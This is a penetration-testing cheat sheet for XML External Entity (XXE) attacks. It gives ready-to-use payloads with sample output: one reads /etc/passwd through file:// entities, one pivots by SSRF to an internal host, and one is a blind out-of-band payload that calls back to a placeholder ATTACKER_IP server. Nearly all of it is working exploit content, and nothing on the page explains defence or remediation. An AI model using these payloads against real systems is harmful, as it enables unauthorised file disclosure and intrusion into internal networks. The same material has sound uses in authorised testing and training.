# XML EXTERNAL ENTITY (XXE)

### Test for XXE

Submit in XML inputs — APIs, file uploads, SOAP

```bash
<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<root>&xxe;</root>
```

<details>
<summary>Example Output</summary>

```
Submit XML:
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<root>&xxe;</root>

Response includes:
root:x:0:0:root:/root:/bin/bash
(XXE CONFIRMED - can read files)
```
</details>

---

### XXE to read files

Read local files — LFI via XML parser

```bash
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
```

<details>
<summary>Example Output</summary>

```
Submit:
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<user>&xxe;</user>

Response:
root:x:0:0:root:/root:/bin/bash
www-data:x:33:33:...
(File read via XXE)
```
</details>

---

### XXE SSRF

Access internal services — Pivot to internal network

```bash
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://internal-host/">]>
```

<details>
<summary>Example Output</summary>

```
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://172.16.1.10:8080/">]>
<root>&xxe;</root>

Response includes internal page content
(Access internal services through XXE)
```
</details>

---

### Blind XXE (out-of-band)

Confirm with HTTP callback — If no output in response

```bash
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://ATTACKER_IP:8000/xxe">]>
```

<details>
<summary>Example Output</summary>

```
Submit:
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://ATTACKER_IP:8000/gotcha">]>

Attacker HTTP server:
10.10.10.5 - - 'GET /gotcha HTTP/1.1' 200 -
(Confirms XXE even with no visible output)
```
</details>

---
